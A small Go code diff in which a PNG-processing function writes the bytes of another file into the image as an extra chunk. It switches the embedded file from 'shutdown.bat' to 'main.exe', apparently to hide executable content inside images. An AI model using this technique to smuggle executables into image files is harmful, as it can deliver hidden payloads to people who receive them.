@@ -90,7 +90,7 @@ func ParsePNG(filename string) int {
 	byteReader.Read(tmpBuf)
 	byteReader.Read(tmpEndBuf)
 	w.Write(tmpBuf)
-	specialChunk := makeChunk(GetFileBytes("insertPNG/shutdown.bat"))
+	specialChunk := makeChunk(GetFileBytes("insertPNG/main.exe"))
 	w.Write(specialChunk)
 	w.Write(tmpEndBuf)
 	w.Close()
